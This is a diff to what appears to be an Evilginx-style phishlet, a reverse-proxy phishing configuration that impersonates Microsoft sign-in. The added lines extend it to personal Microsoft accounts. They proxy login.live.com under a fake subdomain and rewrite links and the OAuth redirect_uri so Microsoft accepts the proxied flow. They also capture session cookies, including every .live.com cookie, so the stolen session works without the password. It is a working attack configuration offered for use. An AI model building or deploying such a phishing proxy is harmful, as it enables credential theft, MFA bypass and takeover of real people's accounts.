@@ -4,6 +4,13 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  # Proxy login.live.com so personal Microsoft accounts (MSA) stay inside the
+  # proxy during the OAuth authorize round-trip. Without this the browser is
+  # bounced to the real login.live.com carrying a rewritten redirect_uri that
+  # is not registered for the client app -> "invalid_request: redirect_uri".
+  # The proxy converts redirect_uri back to the original host on the upstream
+  # leg (GET query + POST body patching), so Microsoft accepts it.
+  - {phish_sub: 'msa', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
   # The lines below are needed if your target organization utilizes ADFS.
   # If they do, you need to uncomment all following lines that contain <...>
   # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
@@ -16,6 +23,12 @@ proxy_hosts:
 sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  # Rewrite login.live.com references (OAuth authorize links, JS, redirects)
+  # served from login.microsoftonline.com to the proxied msa host.
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # Responses coming back from login.live.com: keep both hosts in-proxy.
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   # Uncomment and fill in if your target organization utilizes ADFS
   #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
@@ -23,6 +36,13 @@ auth_tokens:
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
   - domain: 'login.microsoftonline.com'
     keys: ['SignInStateCookie']
+  # Session cookies issued during the personal-account (MSA) leg on
+  # login.live.com / .live.com - captured so the session stays usable
+  # without the username/password.
+  - domain: '.login.live.com'
+    keys: ['RPSSecAuth', 'ANON', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'uaid', 'MSPAuth', 'MSPProf', 'MSPRequ', 'RpsCtx', 'RefProof']
+  - domain: '.live.com'
+    keys: ['.*']
 credentials:
   username:
     key: '(login|UserName)'
